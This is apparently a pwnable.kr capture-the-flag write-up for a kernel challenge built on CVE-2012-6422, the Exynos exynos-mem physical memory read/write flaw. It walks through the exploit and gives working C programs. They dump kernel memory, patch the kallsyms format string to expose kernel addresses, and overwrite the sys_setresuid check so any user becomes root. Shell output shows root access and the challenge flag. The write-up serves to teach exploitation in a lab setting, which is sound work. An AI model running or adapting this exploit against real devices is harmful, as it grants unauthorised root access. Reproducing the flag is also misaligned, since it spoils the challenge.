# pwnable.kr_solves
writeups/scripts for some of the pwnable.kr challenges i solved

**this challenge requires syscall's flag, because it is a more advanced exploitation of a kernel vulnrabillities**
 

the system provides us with root directory with one iregular executable, that the normal linux kernel doesnt contain: `exynos-mem`. as i turns out theres an CVE for that. CVE-2012-6422. in an xda forum theres a full elaboration and a POC: https://xdaforums.com/t/root-security-root-exploit-on-exynos.2048511/. the CVE basiically lets arbitrary write and read. the exynos-mem in this challenge function practically the same. it requests phys memory and freely writes and reads it. now the easiest way to get root is to overwrite some syscall with an exploit and call it. the challenge is finding its exact adress AND converting it to phys address. in the POC the author does smt very cool. he searcghes for the format of the /proc/kallsyms and changes the %Kp to %p (the %Kp blocks non root users seeing the vmemory of the functions in it):


```c
   /*
    * search the format string "%pK %c %s\n" in memory
    * and replace "%pK" by "%p" to force display kernel
    * symbols pointer
    */
for(m = 0; m < length; m += 4) {
    if(*(unsigned long *)tmp == 0x204b7025 && *(unsigned long *)(tmp+1) == 0x25206325 && *(unsigned long *)(tmp+2) == 0x00000a73 ) {
        printf("[*] s_show->seq_printf format string found at: 0x%08X\n", PAGE_OFFSET + m);
        restore_ptr_fmt = tmp;
        *(unsigned long*)tmp = 0x20207025;
        found = true;
        break;
    }
    tmp++;
}
```

now since the challenge's ecynos-mem dumps the read memory into stdin and reads from stdout ill dump all the read data into a file and use iterate over it ( in order to also patch the /proc/kallsyms. now for this machine i also need to find the PAGE_OFFSET and the PHYS_OFFSET. this can be done easily:
after hthis he pacthes the setuid function to be acessible to any user. by calculating the physical address from the PAGE_OFFSET and PHYS_offset. with the commands 

```bash
/ $ cat /proc/iomem | grep Kernel
  60008000-60485f3f : Kernel code
  604ba000-605065cf : Kernel data
/ $
```
**so PHYS_OFFSET is 0x60008000**

the PAGE_OFFSET is more confusing. normally i could check the static build in /boot/system.map. however for some reason its wrong. and its not due to the **kaslr because its off** because it doesnt exist in the version of this kernel (armv7l 3.11.4 ;inux). in order to find the real one i ran the custom kallsyms patcher:

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>

#define BASE 1610612736   // 0x60000000
#define SIZE 4000000

int main(void)
{
    FILE *f;
    unsigned char *buf;
    unsigned long i;
    unsigned long found_addr = 0;
    char cmd[256];

    /*
     * pattern for:
     * %pK %c %s\n\0
     */
    unsigned char pattern[] = {
        0x25, 0x70, 0x4b, 0x20,
        0x25, 0x63, 0x20, 0x25,
        0x73, 0x0a, 0x00
    };
    snprintf(cmd, sizeof(cmd),
             "./exynos-mem %u %u 0 > /tmp/kdump.bin",
             BASE, SIZE);

    system(cmd);

    f = fopen("/tmp/kdump.bin", "rb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    buf = malloc(SIZE);
    if (!buf) {
        perror("malloc");
        fclose(f);
        return 1;
    }

    fread(buf, 1, SIZE, f);
    fclose(f);
    for (i = 0; i < SIZE - sizeof(pattern); i++) {
        if (memcmp(buf + i, pattern, sizeof(pattern)) == 0) {
            found_addr = BASE + i;
            printf("[+] found at physical addr: %lu\n", found_addr);
            printf("[+] hex addr: 0x%08lx\n", found_addr);
            break;
        }
    }

    free(buf);

    if (!found_addr)
        return 1;
  // patchinng
    snprintf(cmd, sizeof(cmd),
             "printf '\\x25\\x70\\x20\\x20' | ./exynos-mem %lu 4 1",
             found_addr);
    system(cmd);
    snprintf(cmd, sizeof(cmd),
             "./exynos-mem %lu 16 0 | xxd -g 1",
             found_addr);

    system(cmd);

    return 0;
}

```bash
/ $ head -c 100 /proc/kallsyms
  (null)  t __vectors_start
80008240  T asm_do_IRQ
80008240  T _stext
80008240  T __exception_text_s/ $
```

by this. i can know PAGE_OFFSET = 0x80000000


in order to verify that ill overwrite some random syscall and see if itll segfault: do_getitimer vaddres is in 0x80022b9c so phys = 0x60000000 + 0x80022b9c - 0x80000000 = 0x60022b9c =  1610754972 decimal.
```bash
/ $ printf 'CRSH' | ./exynos-mem 1610754972 4 1
processed 4 bytes
/ $ ./tmp/testex1
calling getitimer...
Segmentation fault
```
now when i have verified i can freely patch anything, ill patch the setuid like in the original POC to be acsses by all
```c
the original patch:
        if (found) {
            tmp = paddr;
            tmp += (addr_sym - PAGE_OFFSET) >> 2;
            for(m = 0; m < 128; m += 4) {
                if (*(unsigned long *)tmp == 0xe3500000) {
                    printf("[*] patching sys_setresuid at 0x%08X\n",addr_sym+m);
                    restore_ptr_setresuid = tmp;
                    *(unsigned long *)tmp = 0xe3500001;
                    break;
                }
                tmp++;
            }
            break;
        }
```

ill integrate it to the current challenge: (the address shown is of sys setresuid)
```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define ADDR 1610806204   // 0x6002f3bc
#define SIZE 128

int main(void)
{
    FILE *f;
    unsigned char buf[SIZE];
    unsigned char needle[] = {0x00, 0x00, 0x50, 0xe3};
    char cmd[256];
    int i;

    system("./exynos-mem 1610806204 128 0 > /tmp/setresuid.bin");

    f = fopen("/tmp/setresuid.bin", "rb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    fread(buf, 1, SIZE, f);
    fclose(f);

    for (i = 0; i < SIZE - 4; i += 4) {
        if (memcmp(buf + i, needle, 4) == 0) {
            unsigned int patch_addr = ADDR + i;
            snprintf(cmd, sizeof(cmd),
                     "printf '\\x01\\x00\\x50\\xe3' | ./exynos-mem %u 4 1",
                     patch_addr);
            system(cmd);
            printf("[+] patched bytes:\n");
            snprintf(cmd, sizeof(cmd),
                     "./exynos-mem %u 4 0 | od -An -tx1",
                     patch_addr);
            system(cmd);
            return 0;
        }
    }

    return 0;
}
and after this i ran i setresuid(0,0,0) script and got a shell:

```bash
/ $ vi /tmp/victory.c
/ $ gcc /tmp/victory.c -o /tmp/victory
/ $ ./tmp/victory
[+] before: uid=1000 euid=1000
[+] after: uid=0 euid=0
/bin/sh: can't access tty; job control turned off
/ # ls root
flag
/ # cat flag
cat: can't open 'flag': No such file or directory
/ # cat /root/flag
r3ad_Writ3_kernel_m3mory_as_1_want
/ #
```
